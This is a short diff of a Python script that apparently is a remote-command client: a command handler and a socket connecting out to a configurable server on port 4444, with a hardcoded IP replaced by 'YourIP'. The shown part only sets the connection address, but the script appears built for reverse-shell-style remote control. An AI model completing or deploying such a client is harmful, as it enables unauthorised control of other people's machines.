@@ -97,7 +97,7 @@ def handle_command(command):
         return "Unknown command"
 
 # ==== Client Initialization ====
-host = '10.42.185.22'  # Server IP address (change as needed)
+host = 'YourIP'  # Server IP address (change as needed)
 port = 4444            # Server port
 
 s = socket.socket()
